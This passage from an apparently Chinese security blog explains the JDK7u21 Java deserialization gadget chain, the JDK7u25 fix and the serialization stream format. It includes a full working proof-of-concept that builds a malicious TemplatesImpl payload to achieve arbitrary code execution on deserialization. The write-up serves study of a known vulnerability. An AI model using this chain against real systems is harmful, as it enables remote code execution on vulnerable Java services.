<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>h ^= key.hashCode();<br>h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);<br>h = h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);<br><span class="hljs-keyword">return</span> h &amp; <span class="hljs-number">15</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>除了 <code>key.hashCode()</code> 外再没有其他变量，所以<code>proxy</code>对象与<code>TemplateImpl</code>对象的“哈希”是否相等，仅取决于这两个对象的 <code>hashCode()</code> 是否相等。<code>TemplateImpl</code>的 <code>hashCode()</code> 是一个<code>Native</code>方法，每次运行都会发生变化，我们理论上是无法预测的，所以想让<code>proxy</code>的 <code>hashCode()</code> 与之相等，只能寄希望于<code>proxy.hashCode()</code> </p>
<blockquote>
<p>native方法是Java中的一种特殊类型的方法，它们的实现是用其他语言（如C或C ++）编写的，并且不是在Java源代码中提供的。这些方法通常用于执行与平台相关的操作，或者访问底层系统资源，这些操作无法使用纯Java代码完成</p>
</blockquote>
<p>在CC1中我们提到了动态代理会劫持代理类的内部方法，所以这里<code>proxy.hashcode()</code>会调用到<code>AnnotationInvovationHandler#invoke</code>方法，从而调用到<code>AnnotationInvocationHandler#hashCodeImpl</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCodeImpl</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;<br>        result += (<span class="hljs-number">127</span> * e.getKey().hashCode()) ^<br>                memberValueHashCode(e.getValue());<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>遍历 memberValues 这个Map中的每个key和value，计算每个 <code>(127 * key.hashCode()) ^value.hashCode()</code> 并求和。</p>
<p>JDK7u21中使用了一个非常巧妙的方法：</p>
<ul>
<li><p>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^value.hashCode()</p>
</li>
<li><p>当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成value.hashCode() 。</p>
</li>
<li><p>当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等</p>
</li>
</ul>
<p>所以，我们找到一个hashCode是0的对象作为 memberValues 的key，将恶意TemplateImpl对象作为value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p>
<p>找一个hashCode是0的对象，我们可以写一个简单的爆破程序来实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.deserialization;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dumper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>                System.out.println(Long.toHexString(i));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>跑出来第一个是 f5a5a608 ，这个也是ysoserial中用到的字符串。</p>
<p>利用链的构造</p>
<ul>
<li>首先生成<code>TemplateImpl</code>对象</li>
<li>实例化<code>AnnotationInvocationHandler</code>对象<ul>
<li>type属性为TemplateImpl类</li>
<li>memberValues属性是Map，Map只有一个key与value，key为我们之前得到的f5a5a608，value是前面生成的恶意TemplateImpl对象</li>
</ul>
</li>
<li>对AnnotationInvocationHandle对象来一层代理，生成proxy对象</li>
<li>实例化Hashset，HashSet有两个元素，分别为<ul>
<li>TemplatesImpl对象</li>
<li>proxy对象</li>
</ul>
</li>
<li>将HashSet序列化</li>
</ul>
<p>所以代码就会这样执行</p>
<ul>
<li>触发HashSet的readObject方法，其中使用HashMap的key去重</li>
<li>去重时计算HashSet中的两个元素的 hashCode() ，因为我们的静心构造二者相等，进而触发equals() 方法</li>
<li>调用 AnnotationInvocationHandler#equalsImpl 方法</li>
<li>equalsImpl 中遍历 this.type 的每个方法并调用</li>
<li>因为 this.type 是TemplatesImpl类，所以触发了 newTransform() 或 getOutputProperties()方法</li>
<li>任意代码执行</li>
</ul>
<p>具体的代码实例可以看<code>JavaThings-master</code>中的<code>JDK7u21</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.deserialization;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK7u21</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// 实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// 为tempHandler创造一层代理</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// 将恶意templates设置到map中</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方在JDK7u25中是这样修复问题的</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410225833994.png" srcset="/img/loading.gif" lazyload alt="image-20230410225833994"> </p>
<p>原本判断了是不是annotation类型以后什么也没有做，只是将函数返回</p>
<p>现在抛出了一个异常，即如果不是annotation类型以后会导致整个过程终止</p>
<p>但这样又导致了JDK8u20，下面来介绍8u20的原因</p>
<h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p>
<h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>    magic version contents<br>contents:<br>    content<br>    contents content<br>content:<br>    object<br>    blockdata<br>object:<br>    newObject<br>    newClass<br>    newArray<br>    newString<br>    newEnum<br>    newClassDesc<br>    prevObject<br>    nullReference<br>    exception<br>    TC_RESET<br></code></pre></td></tr></table></figure>

<p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p>
<p>它是有三部分组成：magic、version和contents。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure>

<p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p>
<p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure>

<p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p>
<p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure>

<p>content又是由object和blockdata组成</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure>

<p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p>
<p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p>
<p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure>

<p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p>
<p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p>
<p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p>
<p><strong>TC_的含义</strong></p>
<blockquote>
<p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p>
<p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p>
<ul>
<li>TC_OBJECT（对象）</li>
<li>TC_CLASSDESC（类描述符）</li>
<li>TC_ARRAY（数组）</li>
<li>TC_STRING（字符串）</li>
<li>TC_LONGSTRING（长字符串）</li>
<li>TC_NULL（null值）</li>
<li>TC_REFERENCE（引用）</li>
<li>TC_EXCEPTION（异常）</li>
<li>TC_BLOCKDATA（数据块）</li>
<li>TC_ENDBLOCKDATA（数据块结束）</li>
</ul>
<p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p>
</blockquote>
<h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><h3 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure>

<p>将得到的Base64的数据流用zkar进行分析，这里还是用p神那张图</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223224253392.png" srcset="/img/loading.gif" lazyload alt="image-20230223224253392"> </p>
<p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p>
<p>这个 classDesc 的ID，也就是handler为8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p>
<p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p>
<h3 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AuthClass</span> <span class="hljs-variable">authClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthClass</span>(<span class="hljs-string">&quot;123456&quot;</span>);<br>  <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./authClass.bin&quot;</span>));<br>  oos.writeObject(authClass);<br>  oos.writeObject(authClass);<br>  oos.close();<br></code></pre></td></tr></table></figure>

<p>将同一个对象执行两次writeObject，序列化数据经过SerializationDumper处理如下，其中new_handle的值是SerializationDumper标注出的，实际并不存在。</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414183955883.png" srcset="/img/loading.gif" lazyload alt="image-20230414183955883"> </p>
<p>序列化的内容如下：</p>
<ul>
<li><p>STREAM_MAGIC 数据头 0xaced</p>
</li>
<li><p>STREAM_VERSION 序列化数据版本呢 0x0005</p>
</li>
<li><p>TC_OBJECT 0x73 表示接下来的序列化数据是一个object，用0x73表示，除了Object，还有TC_REFERENCE、TC_STRING等，分别表示接下来不同的数据类型，对应不同的处理方法。</p>
<ul>
<li>TC_CLASSDESC 0x72类的描述符 标识接下来是类的一些属性以及信息等等信息<ul>
<li>Length 0x00 30 类名长度</li>
<li>Value 0x79736f73657269616c2e7061796c6f6164732e7765626c6f6769635f686967682e74657374243141757468436c617373 类名</li>
<li>serialVersionUID 0x00 00 00 00 00 00 00 64序列化数据ID</li>
<li>newHandle 0x00 7e 00 00 这个是SerializationDumper手动添加的，实际的序列化数据中不存在这个值，便于后续计算REFERENCE</li>
<li>classDescFlags 0x02 类描述符标记，一个单位标记符</li>
<li>fieldCount 0x0001 对象的成员属性的数量</li>
<li>Fields 对象的成员属性(包含了属性名及属性类型)<ul>
<li>Object 0x4c 标识成员类的种类，除了L(0x4c)还有B(Byte)、C(char)等。</li>
<li>Length 0x0008 成员名长度</li>
<li>Value 0x70617373776f7264 成员名</li>
<li>TC_STRING 0x74成员类型<ul>
<li>newHandle 0x00 7e 00 01 第二个handle</li>
<li>Length 0x00 12 长度</li>
<li>Value 0x4c6a6176612f6c616e672f537472696e673b</li>
</ul>
</li>
</ul>
</li>
<li>TC_ENDBLOCKDATA 0x78 标识一个类结束</li>
<li>superClassDesc 0x70父类的类描述</li>
</ul>
</li>
<li>classdata 类的成员变量的值<ul>
<li>TC_STRING 0x74 字符串类型</li>
<li>newHandle 0x00 7e 00 03 值对应的handle</li>
<li>Value 0x313233343536 成员变量的值</li>
</ul>
</li>
<li>TC_REFERENCE 0x71 第二个对象，是个reference类型<ul>
<li>Handle 0x00 7e 00 02 handle的地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>一共出现了4个handle，用readObject读取这四个handle标识的对象</p>
<p>0x007e0000 ysoserial.payloads.weblogic_high.test$1AuthClass.class 的ObjectStreamClass对象，对应TC_CLASSDESC的内容</p>
<p>0x007e0001 char[]对象，标识成员属性（password）的类型</p>
<p>0x007e0002 ysoserial.payloads.weblogic_high.test$1AuthClass.class对象</p>
<p>0x007e0003 ysoserial.payloads.weblogic_high.test$1AuthClass.passsword的值</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414221257829.png" srcset="/img/loading.gif" lazyload alt="image-20230414221257829"> </p>
